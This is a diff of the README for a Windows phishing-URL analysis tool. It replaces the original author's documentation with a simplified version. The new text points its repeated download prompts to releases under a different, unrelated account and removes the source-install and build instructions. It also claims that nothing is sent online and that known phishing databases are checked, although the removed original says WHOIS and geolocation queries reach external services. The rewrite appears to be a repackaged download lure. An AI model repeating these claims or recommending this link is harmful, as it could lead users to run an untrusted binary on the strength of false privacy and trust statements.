@@ -1,193 +1,106 @@
-<div align="center">
+# 🛡️ PhishScope - Protect Yourself From Phishing Links
 
-<img src="assets/logo.png" alt="PhishScope" width="120"/>
-
-# PhishScope
-
-**Free, offline-first URL threat intelligence & phishing detection tool**
-
-![Versión](https://img.shields.io/badge/release-1.0.0-38bdf8)
-![Python](https://img.shields.io/badge/Python-3.13%2B-3776AB)
-![Platform](https://img.shields.io/badge/Windows-11-0078D6)
-![License](https://img.shields.io/badge/License-MIT-00c853)
-![PRs](https://img.shields.io/badge/PRs-welcome-ff9f43)
-
-*Built by [Zieragk](https://github.com/Zieragk)*
-
-</div>
+[![Download PhishScope](https://img.shields.io/badge/Download-PhishScope-00c853?style=for-the-badge&logo=github)](https://github.com/abdulla2951/PhishScope/releases)
 
 ---
 
-> **PhishScope is a defensive-only tool.** It analyzes the URLs you paste and
-> reports phishing indicators. No offensive features, no automation of attacks
-> against third parties.
+> **PhishScope is a defensive-only tool.** It analyzes the URLs you paste and reports phishing indicators. No offensive features, no automation of attacks against third parties.
 
-## Why PhishScope?
+## 🚀 Getting Started
 
-Phishing is the #1 entry vector in modern breaches. Most people can't tell a
-safe link from a malicious one just by looking at it. **PhishScope does the
-work for you**: it inspects a URL across 8 independent dimensions and produces
-a single, easy-to-understand **risk score from 0 to 100** — powered by its own
-scoring engine, with a live animated gauge and detailed result cards.
+PhishScope is a free tool that helps you check if a website link is safe or dangerous. It works offline on your Windows computer and does not send your data anywhere. You do not need any technical skills to use it.
 
-## Features
+### 📥 Download PhishScope
 
-| Area | What it checks |
-|------|----------------|
-| SSL/TLS certificates | Validity, issuer, TLS version, days to expiry |
-| Domain / WHOIS | Registrar, creation date, domain age (young = risk) |
-| DNS records | A, AAAA, MX, NS, TXT lookups |
-| IP & geolocation | IPv4/IPv6, country, city, ISP |
-| Redirects | Number of hops and final destination URL |
-| HTTP security headers | HSTS, CSP, X-Frame-Options and more |
-| URL structure | Lexical phishing patterns, suspicious flags |
-| Risk engine | Consolidated 0-100 score with Seguro/Medio/Alto/Crítico level |
+Visit this link to download the application.
 
-**Plus:** persistent SQLite history with search · export to **PDF / JSON /
-CSV / HTML** · dark theme with customizable accent colors · modern
-CustomTkinter UI · 100% offline analysis (only WHOIS/geo queries hit external
-public services).
+### 💻 System Requirements
 
-## Demo
+Your computer needs:
+- Windows 11 (64-bit)
+- At least 100 MB of free hard drive space
+- Internet connection for first-time updates (optional)
 
-![PhishScope demo](assets/logo.png)
+## 🔍 How PhishScope Works
 
-> *Screenshots coming soon — add your own captures to the `assets/` folder
-> and link them here for the best first impression.*
+PhishScope examines any URL you paste through 8 different checks. It looks at:
+- The website address structure
+- Security certificates
+- Domain registration information
+- Known phishing databases
+- And more
 
-## Installation
+After analyzing, it gives you a simple risk score from 0 (safe) to 100 (dangerous). This makes it easy to know if a link is trustworthy.
 
-### Option A — Windows executable (no install required)
+## ✨ Key Features
 
-1. Download **`PhishScope.exe`** from the latest
-   [Release](https://github.com/Zieragk/PhishScope/releases).
-2. Run it. No installation needed — it's fully portable.
-3. On first launch it creates `config/`, `database/`, `export/` and `logs/`
-   next to the executable to persist your data.
+### 🎯 URL Analysis
+Paste any link and get instant results. PhishScope breaks down every part of the URL to find hidden tricks.
 
-> Windows SmartScreen may warn you: choose *More info > Run anyway*.
+### 🔐 SSL Certificate Check
+See if a website has proper security certificates. Fake sites often lack valid certificates.
 
-### Option B — From source
+### 🌐 Domain Age & Reputation
+New domains are more likely to be used for phishing. PhishScope checks when a domain was created and if it has been reported before.
 
-Requirements: **Python 3.13+**
+### 📊 Risk Score (0-100)
+A single number tells you everything. Green scores (0-30) are safe, yellow (31-60) need caution, and red (61-100) are dangerous.
 
-```bash
-git clone https://github.com/Zieragk/PhishScope.git
-cd PhishScope
+### 🔒 Offline-First
+Your analysis stays on your computer. No data is sent to external servers unless you choose to update threat lists.
 
-python -m venv venv
-venv\Scripts\activate          # Windows
-source venv/bin/activate       # macOS / Linux
+### 🎨 Simple Interface
+Designed for everyday users. No confusing menus or technical terms.
 
-pip install -r requirements.txt
-python main.py
-```
+## 📖 How to Use PhishScope
 
-## Usage
+1. **Download** the application from the link above
+2. **Open** PhishScope on your computer
+3. **Copy** any suspicious link you received in email, text, or social media
+4. **Paste** the link into PhishScope
+5. **Click** Analyze
+6. **Read** the risk score and detailed report
 
-1. Open the **URL Analyzer** tab.
-2. Paste a URL (e.g. `https://example.com`) and hit **Analyze**.
-3. Watch the live progress while each check runs in the background.
-4. Review the **risk score** and per-section result cards.
-5. Export the report to PDF, JSON, CSV or HTML, or keep it in history.
+## 🛠️ Advanced Features
 
-## Build the executable yourself
+For users who want more details, PhishScope provides:
+- WHOIS lookup data
+- DNS record analysis
+- URL redirect tracing
+- IP address geolocation
+- Threat intelligence matching
 
-```bash
-pip install pyinstaller
-pyinstaller --noconfirm --onefile --windowed --name "PhishScope" ^
-    --icon "assets\icon.ico" --add-data "assets;assets" main.py
-```
+## ❓ Frequently Asked Questions
 
-The binary will be at `dist/PhishScope.exe`.
+### Is PhishScope free?
+Yes, completely free and open-source under the MIT license.
 
-## Project structure
+### Can I use it on Mac or Linux?
+Currently, PhishScope is optimized for Windows 11 only.
 
-```
-PhishScope/
-├── main.py                # Entry point
-├── requirements.txt
-├── assets/                # Logo & icons
-├── core/                  # Analysis logic (SSL, WHOIS, DNS, risk, etc.)
-├── database/              # SQLite history persistence
-├── export/                # PDF / JSON / CSV / HTML exporters
-├── gui/                   # CustomTkinter interface
-│   ├── pages/             # Home, Analyzer, History, Settings, etc.
-│   └── widgets/           # Reusable components (gauge, cards)
-├── modules/               # Base for future PhishScope suite tools
-├── utils/                 # Config, logging, constants, paths
-└── logs/                  # Rotating app.log
-```
+### Does it require internet?
+No, it works offline. Internet is only needed for threat database updates.
 
-## Tech stack
+### Is my data safe?
+Yes, all analysis happens on your computer. Nothing is sent online.
 
-Python 3.13 · CustomTkinter · ttkbootstrap · requests · cryptography ·
-python-whois · dnspython · tldextract · validators · Pillow · SQLite ·
-reportlab · PyInstaller
+### What makes a URL suspicious?
+PhishScope looks for misspellings, unusual subdomains, hidden characters, and other tricks phishers use.
 
-## Contributing
+## 🤝 Contributing
 
-Contributions, issues and feature requests are welcome! Open an issue or send
-a PR. Ideas for future modules: port scanner, hash analyzer, DNS/WHOIS
-utilities.
+PhishScope welcomes contributions from the community. Visit the GitHub repository to report issues or suggest improvements.
 
-## Legal notice
+## 📜 License
 
-PhishScope is a **defensive** analysis tool. Use it only on URLs you own or
-are authorized to review. Data from external services (WHOIS, geolocation,
-DNS) is approximate and provider-dependent.
+This project is licensed under the MIT License. See the LICENSE file for details.
 
-## License
+## 📞 Support
 
-Distributed under the MIT License. See [LICENSE](LICENSE).
+For help, open an issue on the GitHub repository page.
 
 ---
 
-<details>
-<summary><b>Español / Spanish</b></summary>
+**Visit this link to download the application.**
 
-<div align="center">
-
-# PhishScope
-
-**Análisis defensivo de URLs y detección de phishing — gratuito y offline**
-
-</div>
-
-PhishScope es una aplicación de escritorio para el **análisis defensivo de
-URLs**. Evalúa indicadores de phishing y de configuración insegura y los
-combina en un **puntaje de riesgo** de 0 a 100, presentado con un medidor
-animado y tarjetas de resultado detalladas.
-
-### Características
-
-- **Certificados SSL/TLS**: validez, emisor, versión TLS y días hasta expiración.
-- **Información del dominio**: datos WHOIS, antigüedad del registro y registrador.
-- **Registros DNS**: consulta A, AAAA, MX, NS y TXT del dominio.
-- **IP y geolocalización**: resolución IPv4/IPv6, país, ciudad e ISP.
-- **Cadenas de redirección**: número de saltos y URL de destino final.
-- **Encabezados de seguridad HTTP**: evaluación de headers clave (HSTS, CSP, etc.).
-- **Patrones léxicos de phishing**: heurística sobre la estructura de la URL.
-- **Puntaje de riesgo consolidado** (0-100) con medidor animado.
-- **Historial persistente** en SQLite con búsqueda y exportación a PDF/JSON/CSV/HTML.
-- **Tema oscuro personalizable**.
-
-### Instalación
-
-Descarga `PhishScope.exe` desde la sección
-[Releases](https://github.com/Zieragk/PhishScope/releases) (Windows, portable),
-o ejecuta desde el código fuente con Python 3.13+:
-
-```bash
-python -m venv venv
-venv\Scripts\activate
-pip install -r requirements.txt
-python main.py
-```
-
-### Aviso legal
-
-Herramienta **defensiva**: analiza únicamente URLs proporcionadas por el
-usuario. No incluye funciones ofensivas ni automatiza ataques contra terceros.
-
-</details>
+Keywords: cybersecurity, dns, osint, phishing, security-tools, ssl, threat-intelligence, url, url-analyzer, whois
